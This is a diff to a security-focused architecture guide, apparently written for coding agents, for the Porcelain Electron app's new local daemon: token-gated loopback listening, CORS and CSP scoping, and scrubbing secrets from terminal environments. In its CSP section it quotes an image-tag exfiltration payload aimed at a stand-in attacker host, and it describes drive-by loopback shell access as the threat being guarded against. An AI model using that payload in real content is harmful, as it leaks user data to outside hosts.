@@ -32,19 +32,51 @@ assumed — this skill is the codebase-specific layer beneath them.
   happens in the playground, never against the user's work repos.
 - **The MCP agent channel adds NO inbound network surface.** The feature-view MCP
   server (`src/mcp/`) is a standalone **stdio** process the user's agent spawns — it
-  never opens a port or socket the app listens on. The app *reads* and *watches* one
-  file, `~/.porcelain/review-sets.json` (`review-store.ts` / `review-watch.ts`), which
+  never opens a port or socket. The app *reads* and *watches* one file,
+  `~/.porcelain/review-sets.json` (`review-store.ts` / `review-watch.ts`), which
   it re-validates with zod (`reviewSetsSchema`) on every read because an external
   process owns it. The MCP server **authors** the sets; the app makes exactly ONE
   write — `clearReviewSet` (user-initiated from the Feature tab's Clear button), an
   atomic tmp+rename that deletes a repo's entry (reverting to the baseline). That's a
   local home-dir file write, NOT a network surface, and the app still never authors a
-  set. Don't add other app-side writes to this file, and don't "upgrade" the channel
-  to an in-app HTTP/MCP listener — that's the inbound surface this design deliberately
-  avoids. The server
-  stays **dependency-free** (Node builtins only) so it runs under a plain `node`; don't
-  add npm imports to `src/mcp/`, and keep tool inputs validated in `toReviewFiles`.
-  *Verify:* `rg -n "createServer|listen\(|http" src/main src/mcp` finds nothing new.
+  set. Don't add other app-side writes to this file, and don't "upgrade" the MCP
+  channel to an in-app HTTP/MCP listener. The MCP server stays **dependency-free**
+  (Node builtins only) so it runs under a plain `node`; don't add npm imports to
+  `src/mcp/`, and keep tool inputs validated in `toReviewFiles`.
+- **The daemon is the ONE sanctioned listener — 127.0.0.1 only, ALWAYS token-gated.**
+  Since the daemon split the renderer talks to `src/backend/server.ts` over HTTP + WS
+  (`daemon.ts` spawns it), so the old "the app opens no port" claim no longer holds —
+  but the surface is deliberately hostile-input-hardened, and these must ALL stay true:
+  (1) **The bind never widens beyond loopback** — `server.listen(port, '127.0.0.1')`,
+  never `0.0.0.0` or a public interface, until Phase 2's tailnet work adds the Tailscale
+  interface *behind the same token*. (2) **Auth is never optional:** every `/trpc`
+  request needs `authorization: Bearer <token>` (constant-time compare over sha256
+  digests, 401 otherwise) and the WS upgrade needs the `porcelain.<token>` subprotocol
+  (rejected handshake without it) — loopback is reachable from any webpage the user's
+  browser has open (fetch to 127.0.0.1; WebSockets carry no CORS at all), so an
+  unauthenticated `/session` would hand `terminal:create` — a shell — to drive-by web
+  content. (3) **The token never appears in argv** (`ps`-visible), **stdout** (the
+  daemon's only stdout line is the port; the parent passed the token via env so it
+  already knows it), **or a spawned PTY's env** (see the terminal-env invariant below).
+  (4) **CORS is scoped, never `*`** — only the dev Vite origin (`PORCELAIN_ALLOWED_ORIGIN`)
+  or the packaged `null` origin is echoed; the preflight carries nothing sensitive (the
+  Bearer check on the real request is the gate). Don't relax any of these to "make local
+  dev easier."
+  *Verify:* `rg -n "createServer|listen\(|http\.createServer" src/backend src/main src/mcp`
+  hits exactly `src/backend/server.ts` (the one daemon listener) and nothing in `src/mcp`;
+  the `listen` call still passes `'127.0.0.1'`, and both the Bearer and subprotocol checks
+  are still present.
+- **A spawned PTY's env is scrubbed of the daemon's internals** (`terminalEnv` in
+  `src/backend/terminal-env.ts`, unit-tested). The daemon process env carries the session
+  token and process-mode flags that must NEVER reach a user shell: `PORCELAIN_DAEMON_TOKEN`
+  (a secret — `env` in the terminal would print it) and `ELECTRON_RUN_AS_NODE` (would make
+  any Electron-based binary the user launches from the terminal silently run as plain
+  Node), plus the other daemon-only `PORCELAIN_*` knobs. `terminalEnv` strips the
+  `DAEMON_ONLY_ENV` list and passes the user's real environment through untouched. *Why:*
+  extracted from `terminal-manager.ts` (the one impure module) precisely so the strip list
+  is testable. *Verify:* a new daemon env var that must not leak is added to
+  `DAEMON_ONLY_ENV`; `terminal-env.test.ts` still asserts the token and `RUN_AS_NODE` are
+  absent from a spawned env.
 - **Agent-channel review-set paths are repo-contained on read.**
   `readReviewSet` (`src/main/review-store.ts`) drops any review-set entry whose
   path is absolute or escapes `repoPath` (`isRepoContained`), because the file
@@ -162,7 +194,11 @@ assumed — this skill is the codebase-specific layer beneath them.
   `<img>`/stylesheet/font) — a `srcdoc` document inherits it, and sandbox alone does NOT block
   passive loads. This makes the CSP the real backstop against an HTML-only exfil channel
   (`<img src="https://attacker/?leak=...">`): never widen it (e.g. adding a remote host to
-  `img-src`) while artifacts can render. (3) Reads are zod-validated + size-capped on
+  `img-src`) while artifacts can render. The daemon split added `connect-src 'self'
+  http://127.0.0.1:* ws://127.0.0.1:*` to the same CSP (the renderer must reach the local
+  daemon) — that loopback scope is deliberate and stays loopback-only until Phase 3 opens the
+  browser client; it does NOT relax `img-src`/`default-src`, which remain the artifact
+  backstop. Don't widen `connect-src` past loopback, and don't touch `img-src`/`default-src`. (3) Reads are zod-validated + size-capped on
   EVERY read (`readArtifact` drops an entry whose html exceeds `MAX_HTML_BYTES` = 1.5 MB, and
   never throws — one bad agent write can't break the viewer), because an external process owns the
   file. Same two-way shape as review-sets: the MCP server authors it, the app makes exactly ONE
@@ -213,13 +249,30 @@ assumed — this skill is the codebase-specific layer beneath them.
 
 ## Data fetching & IPC
 
-- **IPC is tRPC over a custom Electron link we own** (tRPC **v11** + `@tanstack/react-query` **v5**). `electron-trpc` is gone (abandoned at 0.7.1, never supported v11). The transport: renderer uses tRPC's official `httpBatchLink` with a custom `fetch` (`lib/trpc.ts`) → `window.porcelain.trpc` → `ipcRenderer.invoke('trpc')`; main (`src/main/ipc.ts`) replays it through tRPC's official `fetchRequestHandler`. Keep all protocol logic inside tRPC — only shuttle bytes; don't reintroduce a transport that reads tRPC internals (that's what rotted electron-trpc). The lone main→renderer push is the dedicated `app-event` IPC channel (`window.porcelain.onAppEvent`), NOT a tRPC subscription. Never raw `ipcMain`/`ipcRenderer` for data; never cast (`as unknown as` is banned repo-wide).
-- **Components never import `@renderer/lib/trpc`** (Biome `noRestrictedImports`
-  override on `components/**`). All server access goes through domain hooks
-  (`hooks/use-<domain>.ts`) that own their post-mutation invalidation. The vanilla
-  client is sanctioned only in `stores/repo.ts` and `use-app-events.ts`.
+- **Data fetching = tRPC (v11) + @tanstack/react-query (v5), over TWO transports since the daemon split.** `electron-trpc` is gone (abandoned at 0.7.1, never supported v11). (1) The **appRouter** (`src/backend/api.ts`, ~all procedures) is REAL tRPC over `httpBatchLink` to the local daemon (`lib/trpc.ts` → `http://127.0.0.1:<port>/trpc`); its streams and push ride the ONE zod-validated WS session (`/session`, `lib/daemon.ts`), where terminals AND watch registration (`watch:files`/`watch:dirs`) are messages, NOT procedures. (2) The **shellRouter** (the Electron-native rump — dialogs, windows, updater, plugin installers, `src/main/shell-api.ts`) still rides a serialized-HTTP shuttle over `invoke('trpc-shell')` replayed through `fetchRequestHandler` (`src/main/ipc.ts`): keep all protocol logic inside tRPC — only shuttle bytes; don't reintroduce a transport that reads tRPC internals (that's what rotted electron-trpc). Shell push (`close-tab`, `update-status`) is the dedicated `shell-event` IPC channel; daemon push is the WS session — NEITHER is a tRPC subscription (there are none). Never raw `ipcMain`/`ipcRenderer` for data; never cast (`as unknown as` is banned repo-wide).
+- **Components never import `@renderer/lib/trpc` OR `@renderer/lib/daemon`**
+  (Biome `noRestrictedImports` override on `components/**`, now lint-enforced for
+  both). All server access goes through domain hooks (`hooks/use-<domain>.ts`)
+  that own their post-mutation invalidation; the daemon WS session is reached only
+  through `use-app-events` / `use-terminal-channel` / `use-files`. The vanilla
+  tRPC client is sanctioned only in `stores/repo.ts` and `use-app-events.ts`.
 - **Never `void` a promise** to silence a floating-promise lint — use `async`/`await`
   or `await Promise.all([...])` for invalidation/prefetch/clipboard.
+- **The daemon child's `error` event MUST be handled, not just `exit`.** `src/main/daemon.ts`
+  attaches one `onChildDown` to BOTH `proc.on('exit')` and `proc.on('error')`, and
+  `awaitReadyLine` rejects on either. *Why:* a failed spawn emits only `error` (no `exit`),
+  and an unhandled child `error` crashes the Electron main process. The shared `wentDown` /
+  ready-await `cleanup` flags stop a failure that emits *both* from double-scheduling a
+  restart or resolving+rejecting the ready promise. Don't drop the `error` listener when
+  touching the lifecycle. *Verify:* `kill -9` the daemon while the app runs → it restarts and
+  the UI recovers; a bad daemon path fails closed, not with an app crash.
+- **On WS-session close, reject every in-flight/queued terminal create and clear the outbox**
+  (`failPendingCreates` in `lib/daemon.ts`, from `ws.onclose`). *Why:* a `createTerminal`
+  promise whose `terminal:created` reply died with the socket would hang forever, and
+  replaying a stale `terminal:create` from the outbox on a much-later reconnect would spawn
+  an abandoned shell nobody awaits. Reconnect DOES re-register watch sets (from `lastWatched*`)
+  and flush the outbox on a *live* open — but a dropped socket's pending creates are rejected,
+  not replayed, so the caller surfaces the error and retries. Don't make creates auto-replay.
 
 ## Performance (must stay fast on a 50 GB monorepo)
 
@@ -278,6 +331,13 @@ assumed — this skill is the codebase-specific layer beneath them.
   needs unpacking. *Verify:* a packaged build's `Resources/app.asar.unpacked/node_modules/node-pty`
   exists and the terminal opens. The renderer half (`@xterm/*`) is Vite-bundled
   `devDependencies` — no packaging concern.
+- **`trash` joins node-pty in `asarUnpack`.** The `trash` package (the electron-free
+  daemon's replacement for `shell.trashItem`, used by `trashPath`/`gitDiscardFile` in
+  `src/backend/api.ts`) ships platform helper binaries (`macos-trash`) it `exec`s at
+  runtime, so `electron-builder.yml` `asarUnpack`s `node_modules/trash/**` too. *Why:* a
+  helper binary packed inside `app.asar` can't be executed — trashing would fail in the
+  packaged app. *Verify:* `node_modules/trash/**` is in the `asarUnpack` list alongside
+  node-pty.
 
 ## How to verify
 
